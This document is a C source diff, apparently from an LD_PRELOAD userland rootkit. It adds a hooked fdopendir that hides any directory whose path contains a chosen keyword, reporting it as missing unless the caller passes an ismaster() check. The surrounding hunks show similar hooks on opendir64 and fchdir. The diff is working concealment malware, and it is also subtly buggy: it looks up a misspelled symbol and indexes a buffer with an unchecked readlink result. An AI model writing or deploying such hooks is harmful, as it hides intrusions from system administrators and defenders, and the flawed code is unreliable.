@@ -9,6 +9,7 @@
 //directory stuff
 DIR *(*old_opendir)(const char *name);
 DIR *(*old_opendir64)(const char *name);
+DIR *(*old_fopendir)(int fd);
 struct dirent *(*old_readdir)(DIR *dirp);
 struct dirent64 *(*old_readdir64)(DIR *dirp);
 int (*old_chdir)(const char *path);
@@ -89,6 +90,36 @@ DIR *opendir64(const char *name){
     }
 
     return old_opendir64(name);
+
+}
+
+DIR *fdopendir(int fd){
+    
+    #ifdef DEBUG
+	printf("fopendir hooked\n");
+    #endif
+    
+    char fd_path[256];
+    char dir[256];
+    int pos;
+
+    if(!old_fopendir){
+	old_fopendir = dlsym(RTLD_NEXT,"fopendir");
+    }
+
+    //converts the filepointer to a filename
+    sprintf(fd_path,"/proc/self/fd/%d", fd);
+    pos = readlink(fd_path, dir, 256);
+    dir[pos] = '\0'; 
+
+    if(strstr(dir,keyword)){
+	if(ismaster() == 0){
+	    errno = ENOENT;
+	    return NULL;
+	}
+    }
+
+    return old_fopendir(fd);
 
 }
 
@@ -204,7 +235,7 @@ int fchdir(int fd){
 
     char fd_path[256];
     char dir[256];
-    int pos;
+    int pos = 0;
 
     if(!old_fchdir){
 	old_fchdir = dlsym(RTLD_NEXT,"fchdir");
